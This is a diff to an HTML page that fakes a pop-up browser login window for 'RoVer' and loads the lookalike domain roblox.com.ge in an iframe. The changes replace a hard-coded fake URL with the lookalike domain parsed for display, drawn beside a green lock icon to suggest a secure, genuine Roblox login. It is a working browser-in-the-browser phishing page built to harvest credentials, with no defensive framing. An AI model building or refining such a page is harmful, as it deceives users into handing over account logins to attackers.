@@ -237,6 +237,7 @@
       overflow: hidden;
       z-index: 1000;
       border: 1px solid #ccc;
+      color: #333;
     }
 
     .window-bar {
@@ -274,6 +275,35 @@
       overflow: hidden;
       white-space: nowrap;
       text-overflow: ellipsis;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      user-select: text;
+    }
+
+    .url-bar .lock-icon {
+      width: 16px;
+      height: 16px;
+      fill: #4CAF50; /* green lock */
+      flex-shrink: 0;
+    }
+
+    .url-bar .protocol {
+      color: #666;
+      font-weight: 400;
+      user-select: text;
+    }
+
+    .url-bar .domain {
+      color: #111;
+      font-weight: 600;
+      user-select: text;
+    }
+
+    .url-bar span:last-child {
+      color: #444;
+      font-weight: 400;
+      user-select: text;
     }
 
     .popup-iframe {
@@ -349,7 +379,9 @@
       RoVer – Login
       <div class="popup-close" id="popupClose">&times;</div>
     </div>
-    <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
+    <div class="url-bar" id="urlDisplay">
+      <!-- URL will be injected here -->
+    </div>
     <iframe class="popup-iframe" id="popupIframe" src=""></iframe>
   </div>
 
@@ -366,10 +398,21 @@
 
     loginBtn.addEventListener("click", () => {
       const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
-      const fakeUrl = "https://www.roblox.com/login";
 
       iframe.src = realUrl;
-      urlDisplay.innerHTML = " " + fakeUrl;
+
+      // Parse URL parts for display
+      const urlObj = new URL(realUrl);
+      const protocol = urlObj.protocol;   // e.g. "https:"
+      const domain = urlObj.host;         // e.g. "roblox.com.ge"
+      const pathAndQuery = urlObj.pathname + urlObj.search; // e.g. "/login?returnUrl=2099296147452818"
+
+      urlDisplay.innerHTML = `
+        <svg class="lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7a3 3 0 0 1 6 0v3H9V7zm9 8v4H6v-4h12z"/>
+        </svg>
+        <span class="protocol">${protocol}//</span><span class="domain">${domain}</span><span>${pathAndQuery}</span>
+      `;
 
       fakePopup.style.display = "block";
       overlay.style.display = "block";
@@ -387,6 +430,3 @@
   </script>
 </body>
 </html>
-
-
-
